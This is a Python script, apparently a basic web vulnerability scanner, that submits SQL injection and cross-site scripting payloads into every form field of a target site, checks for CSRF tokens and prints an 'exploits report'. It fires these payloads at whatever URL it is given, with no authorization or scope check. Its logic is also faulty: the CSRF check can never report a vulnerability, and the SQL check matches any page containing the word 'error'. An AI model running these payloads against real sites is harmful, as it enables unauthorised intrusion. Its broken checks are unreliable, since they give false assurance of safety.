import requests
from bs4 import BeautifulSoup


def sql_injection(target):
    payloads = ["'OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", "' OR 'a'='a"]

    response = requests.get(target)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')
    vulnerable = False

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()

        data = {}
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            if input_name:
                data[input_name] = 'test'

        for payload in payloads:
            for key in data.keys():
                data[key] = payload
                if method == 'post':
                    result = requests.post(target + action, data=data)
                else:
                    result = requests.get(target + action, params=data)

                if "error" in result.text or "syntax" in result.text or "SQL" in result.text:
                    print(f"Possible SQL Injection vulnerability found with payload {payload} in form {action}")
                    vulnerable = True

    if not vulnerable:
        print("No SQL injection vulnerabilities found.")

    return vulnerable


def xss(target):
    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<body onload=alert(1)>"]

    response = requests.get(target)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')
    vulnerable = False

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()

        data = {}
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            if input_name:
                data[input_name] = 'test'

        for payload in payloads:
            for key in data.keys():
                data[key] = payload
                if method == 'post':
                    result = requests.post(target + action, data=data)
                else:
                    result = requests.get(target + action, params=data)

                if payload in result.text:
                    print(f"Possible XSS vulnerability found with payload {payload} in form {action}")
                    vulnerable = True

    if not vulnerable:
        print("No XSS vulnerabilities found.")

    return vulnerable


def csrf(target):
    response = requests.get(target)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    vulnerable = False

    for form in forms:
        inputs = form.find_all('input')
        for input_tag in inputs:
            if 'csrf' in input_tag.get('name', '').lower() or 'csrf' in input_tag.get('id', '').lower() or 'csrf' in input_tag.get('username', '').lower():
                print("CSRF token found.")
                vulnerable = False
                break

    if vulnerable:
        print("No CSRF token found. Possible CSRF vulnerability.")
    else:
        print("No CSRF vulnerabilities found.")

    return vulnerable


def automate_all(target):
    report = {"SQL_Injection": sql_injection(target), "XSS": xss(target), "CSRF": csrf(target)}

    print("**** EXPLOITS REPORT ****")
    for exploit, result in report.items():
        status = "Vulnerable" if result else "Not Vulnerable"
        print(f"{exploit}: {status}")



